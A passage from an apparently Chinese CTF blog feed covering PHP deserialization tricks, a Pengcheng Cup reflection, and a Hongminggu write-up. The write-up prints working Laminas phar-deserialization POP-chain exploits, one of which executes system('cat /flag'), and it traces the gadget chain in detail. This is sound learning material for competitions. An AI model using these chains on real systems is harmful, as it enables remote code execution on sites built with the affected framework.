&quot;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>而当再次反序列化的时候，内容并没有发生变化，这就说明了当序列化<code>__PHP_Incomplete_Class</code>时会先去查找属性<code>__PHP_Incomplete_Class_Name</code>的值，然后进行序列化为相对应的类</p>
<p>而我们可以根据该特点构造相对应的字符串，即构造存在<code>__PHP_Incomplete_Class</code>类但类中却不存在<code>__PHP_Incomplete_Class_Name</code>属性，当该字符串经过反序列化和序列化之后就会丢弃类里面的其他属性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// class A&#123;</span></span><br><span class="line"><span class="comment">//     public $test = &#x27;a&#x27;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(serialize(unserialize(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">//object(__PHP_Incomplete_Class)#1 (1) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;test&quot;]=&gt;</span></span><br><span class="line"><span class="comment">//  string(1) &quot;a&quot;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//string(34) &quot;O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="n-3ctf-Ezunser"><a href="#n-3ctf-Ezunser" class="headerlink" title="n^3ctf_Ezunser"></a>n^3ctf_Ezunser</h3><p><a href="https://buuoj.cn/match/matches/68/challenges">题目</a></p>
<p>反序列化未定义的类</p>
<p>直接给了源码：</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAutoloader</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$classname</span>.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    spl_autoload_register(<span class="string">&#x27;myAutoloader&#x27;</span>);</span><br><span class="line">    <span class="variable">$raw</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/Evil/&quot;</span>,<span class="variable">$raw</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Evil Classes!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pop</span>);</span><br><span class="line">    var_dump(<span class="variable">$o</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;EvillClass.php&quot;</span>;</span><br><span class="line">    highlight_file(<span class="string">&quot;EvilClass.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>0x01:</strong></p>
<p>先审计<code>index.php</code></p>
<p>第一个点在于<code>spl_autoload_register</code>，当调用<code>index.php</code>中没有定义的类的时候就会自动调用<code>myAutoloader($classname)</code>，其中<code>$classname</code>就是我们想实例化的类</p>
<p>想当然地我们想调用<code>EvilClass.php</code>里面的类，所以要<code>include EvilClass.php</code>，但是文件里还是没有定义<code>EvilClass</code>，这里就涉及到一个[php反序列的冷知识](<a href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识 - 知乎 (zhihu.com)</a>)</p>
<p>我们还发现之后的if判断语句中ban掉了<code>Evil</code>，这就说明在序列化之后的字符串中不能再出现<code>EvilClass</code>，不过可以直接拿里面的payload</p>
<p>所以payload1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;i:0;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:3:&quot;qwb&quot;;O:9:&quot;EvilClass&quot;:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>……</p>
<h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast __destruct"></a>fast __destruct</h2><p>在__wakeup前触发 __destruct</p>
<blockquote>
<p>1、如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。<br>2、如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p>
</blockquote>
<p>而有时候我们如果提前执行<code>__destruct</code>(析构函数)就会绕过题目中某些限制,从而产生利用点,比如就可以bypass __wakeup(不过与php版本有关)</p>
<p>提前触发的方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改属性个数值:</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ls&quot;;&#125;</span><br><span class="line">去掉序列化尾部:</span><br><span class="line">O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:2:&quot;ls&quot;;</span><br></pre></td></tr></table></figure>

<p>例子:可以明显看到var_dump执行的顺序是不一样的</p>
<p><img src="https://img-blog.csdnimg.cn/42e9ecc30f99495a84db2910200a26cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/0cf72b36e6914f3fb8b0aeaab0227223.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h2 id="反序列化函数闭包"><a href="#反序列化函数闭包" class="headerlink" title="反序列化函数闭包"></a>反序列化函数闭包</h2><p>闭包函数也就是匿名函数,而在定义闭包函数的时候就会自动实例化<code>Closure</code>类</p>
<p><img src="https://img-blog.csdnimg.cn/ce5c520a5605423e85df8d87c7e6ba64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>但是直接用php自带的<code>serialize</code>函数对这个类进行序列化的时候会报错,但是我们可以通过工具去实现闭包函数的序列化</p>
<p><strong>0x01:安装</strong></p>
<p><a href="https://github.com/opis/closure">closure</a></p>
<p><img src="https://img-blog.csdnimg.cn/d503d9e6d45e4162a781cab5c86a794f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>0x02:使用</strong></p>
<p>之后直接测试吧，可以发现闭包函数直接用<code>unserialize</code>反序列化之后和<code>opis\closure\unserialize</code>反序列化的时候的返回值是不一样的但是都可以直接当作函数使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;vendor/autoload.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$b</span> = opis\<span class="built_in">closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">var_dump(opis\<span class="built_in">closure</span>\serialize(<span class="variable">$a</span>));</span><br><span class="line">var_dump(unserialize(<span class="variable">$b</span>));</span><br><span class="line">unserialize(<span class="variable">$b</span>)();</span><br><span class="line">var_dump(opis\<span class="built_in">closure</span>\unserialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(198) &quot;C:32:&quot;Opis\Closure\SerializableClosure&quot;:152:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:29:&quot;function()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;a&quot;;</span></span><br><span class="line"><span class="comment">//&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;000000000bc714b9000000004a5c0eab&quot;;&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(Opis\Closure\SerializableClosure)#2 (5) &#123;</span></span><br><span class="line"><span class="comment">//  [&quot;closure&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  object(Closure)#5 (0) &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  [&quot;reflector&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//  [&quot;code&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  string(29) &quot;function()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;a&quot;;</span></span><br><span class="line"><span class="comment">//&#125;&quot;</span></span><br><span class="line"><span class="comment">//  [&quot;reference&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//  [&quot;scope&quot;:protected]=&gt;</span></span><br><span class="line"><span class="comment">//  NULL</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object(Closure)#7 (0) &#123;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>web程序设计-Project</title>
    <url>/2022/05/06/web%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%BE%80%E6%9C%9F%E4%BD%9C%E4%B8%9A%E5%B1%95%E7%A4%BA/</url>
    <content><![CDATA[<p><a href="https://github.com/ameuu/WebHomework">MyProjectSource</a></p>
]]></content>
      <categories>
        <category>作业</category>
      </categories>
      <tags>
        <tag>homework</tag>
      </tags>
  </entry>
  <entry>
    <title>碎碎念ing</title>
    <url>/2022/07/28/%E7%A2%8E%E7%A2%8E%E5%BF%B5ing/</url>
    <content><![CDATA[<blockquote>
<p>一些在大会上的官话（</p>
</blockquote>
<p>上周末鹏程杯结束了，第一次去线下还是非常激动的，虽然并没有体验到AWD（（（</p>
<p>下面就是关于鹏程杯决赛下来一个web手下小结：</p>
<p>对于Web手而言：</p>
<p>本次鹏程杯决赛虽然说是城市攻防，其实实质上还是解题模式只不过题目更接近于现实应用场景，虽然应该是好几年前的应用场景了。</p>
<ol>
<li>要熟悉sql注入、文件上传等基础漏洞的原理</li>
<li>虽然平常做题的时候用sqlmap是没有灵魂的，但是还是要会用</li>
<li>要会审计。这次的题目几乎都是用php写的，很多都是php的框架并且给了源码，所以某些漏洞是要自己审计出来的</li>
<li>熟练运用各种扫描端口/目录工具。nmap、御剑……</li>
<li>要有大字典</li>
<li>最重要还是平时的积累，线下的时候是不能上网的，所以遇到一些比较明显的CVE的时候，就是要看个人的做题量/复现漏洞量了 thinkphp6 日志文件包含</li>
<li>还有就是内网渗透了，基础的提权EXP……</li>
<li>最后一点就是脑洞吧……</li>
</ol>
<p>对于非Web手而言：</p>
<p>这次比赛大部分的题目都是web方向的题，所以还是建议其他方向的同学在学有余力的时候可以去漏洞银行、ctfwiki等网站简单学习一下web方向常见的漏洞原理</p>
<p>最后：</p>
<p>除了上面一些感受之外，还有一个就是比赛中几乎所有题目都会涉及登录框，一般就是sql注入或者就是弱口令了……</p>
]]></content>
      <categories>
        <category>Ameuu</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>红明谷web</title>
    <url>/2022/03/23/%E7%BA%A2%E6%98%8E%E8%B0%B7web1/</url>
    <content><![CDATA[<h4 id="Fan-website"><a href="#Fan-website" class="headerlink" title="Fan website"></a>Fan website</h4><ul>
<li>文件上传</li>
<li>php反序列化</li>
<li>laminas cve</li>
</ul>
<p>直接有<code>www.zip</code>源码泄露，然后题目是关于<code>laminas</code>的，所以直接搜索<code>laminas cve</code>，就可以发现存在反序列化漏洞，但是我没找到反序列化触发的点</p>
<p><img src="https://img-blog.csdnimg.cn/35772c8f358f427d8a67b6e5ce90436e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<span id="more"></span>

<p>然后可以发现存在文件上传的点</p>
<p><img src="https://img-blog.csdnimg.cn/48b50cc532b84beba48052dd1193cc2f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>并且还存在删除文件的点，那么就可以使用phar协议了，在百度的时候发现phar协议在unlink函数中也是可以执行的</p>
<p>所以直接开干</p>
<p>laminas cve之前没有遇到过，但是网上很多师傅都写了poc，就直接跟着其中某一个走了</p>
<p>但是写完exp之后发现，在文件上传的控制器里面存在过滤</p>
<p><img src="https://img-blog.csdnimg.cn/78ad9a0005544f2a8503ac5375e50229.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>php可以直接去掉，而后面的关键字可以利用gzip压缩绕过（感谢姜少！</p>
<p>网上的exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Laminas</span>\<span class="title">Config</span>\<span class="title">Config</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpRenderer</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                <span class="variable">$res</span> .= <span class="string">&#x27;ameuuameuuameuua&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__content = <span class="variable">$res</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__helpers = <span class="keyword">new</span> Config([]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Config</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;shutdown&#x27;</span>=&gt;<span class="string">&#x27;phpinfo&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>\<span class="title">PhpRenderer</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Phar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writers = [<span class="keyword">new</span> PhpRenderer()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&#x27;__HALT_COMPILER();&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接上传，然后删除的时候用phar协议</p>
<p><img src="https://img-blog.csdnimg.cn/4055e9aa16ab4d888d24bf8067ce6cbd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><a href="https://xz.aliyun.com/u/16398">Mrkaixin</a>师傅的exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Resolver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">TemplateMapResolver</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">map</span> = [&quot;<span class="title">setBody</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">View</span>\<span class="title">Renderer</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PhpRenderer</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">            $<span class="title">res</span> = &#x27;&#x27;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                <span class="variable">$res</span> .= <span class="string">&#x27;ameuuameuuameuua&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__content = <span class="variable">$res</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__helpers = <span class="keyword">new</span> \Laminas\View\Resolver\TemplateMapResolver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Writer</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractWriter</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Mail</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">eventsToMail</span> = [&quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;];  </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$subjectPrependText</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$mail</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mail = <span class="keyword">new</span> \Laminas\View\Renderer\PhpRenderer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Laminas</span>\<span class="title">Log</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Logger</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">writers</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writers = [<span class="keyword">new</span> \Laminas\Log\Writer\Mail()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="title">use</span> <span class="title">Laminas</span>\<span class="title">Log</span>\<span class="title">Logger</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Logger();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&#x27;__HALT_COMPILER();&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/d1d4908d93b342c4816e79541d86024e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="赛后思考"><a href="#赛后思考" class="headerlink" title="赛后思考"></a>赛后思考</h5><p><del>因为当时是直接用别的师傅的poc打的，只是大概地走了一遍防止poc不一致，所以现在再来仔细走一遍，试着能不能自己挖出一条（？</del></p>
<p><strong>0x01:Logger-destruct开始</strong></p>
<p>首先要找链子的入口，一般会从<code>__construct</code>或者<code>__destruct</code>开始，而Logger类里面的<code>__destrcut</code>存在我们可以控制的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;writers <span class="keyword">as</span> <span class="variable">$writer</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$writer</span>-&gt;shutdown();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里，会调用一个<code>shutdown</code>方法，所以很容易就能想到可能会触发<code>__call</code>魔术方法，然后可以去全局搜索<code>__call</code></p>
<p>可以在<code>PhpRenderer</code>发现限制比较少，并且还存在<code>call_user_func_array</code>函数，直接跟一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$argv</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$plugin</span> = <span class="keyword">$this</span>-&gt;plugin(<span class="variable">$method</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable(<span class="variable">$plugin</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="variable">$plugin</span>, <span class="variable">$argv</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$plugin</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>plugin</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">plugin</span>(<span class="params"><span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$options</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getHelperPluginManager()-&gt;get(<span class="variable">$name</span>, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟踪<code>getHelperPluginManager()</code>方法，直接返回了<code>$this-&gt;__helpers</code>，显而易见这个属性是我们可以完全控制的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHelperPluginManager</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="keyword">$this</span>-&gt;__helpers) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setHelperPluginManager(<span class="keyword">new</span> HelperPluginManager(<span class="keyword">new</span> ServiceManager()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__helpers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那再回去看<code>plugin</code>方法，发现要调用所返回的方法里面的<code>get</code>方法，那么可以继续去找哪里存在我们可以利用的get方法</p>
<p><code>Config</code>-get，直接返回<code>$this-&gt;data[&#39;shutdown&#39;]</code>的值，也是我们可以控制的，就比如我们初始化<code>$this-&gt;data[&#39;shutdown&#39;] = &#39;phpinfo&#39;</code>，这样会将<code>phpinfo</code>一直返回到<code>call_user_func_array($plugin, $argv);</code>，而因为shutdown方法并没有参数，所以就会直接执行<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是就像我说的限制一样，这里不能传入参数，只能执行某一个方法，所以不能用<code>PhpRenderer</code>的<code>__call</code>，得再找找，但是找到的<code>__call</code>方法要么是直接返回一个名字，要么限制过多</p>
<p>再返回到<code>Logger</code>，突然想到那么直接找<code>shutdown</code>方法呢</p>
<p>只有<code>Mail</code>方法好像可以用，审计一下吧！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shutdown</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// If there are events to mail, use them as message body.  Otherwise,</span></span><br><span class="line">    <span class="comment">// there is no mail to be sent.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;eventsToMail)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;subjectPrependText !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Tack on the summary of entries per-priority to the subject</span></span><br><span class="line">        <span class="comment">// line and set it on the Laminas\Mail object.</span></span><br><span class="line">        <span class="variable">$numEntries</span> = <span class="keyword">$this</span>-&gt;getFormattedNumEntriesPerPriority();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mail-&gt;setSubject(<span class="string">&quot;<span class="subst">&#123;$this-&gt;subjectPrependText&#125;</span> (<span class="subst">&#123;$numEntries&#125;</span>)&quot;</span>);</span><br><span class="line">    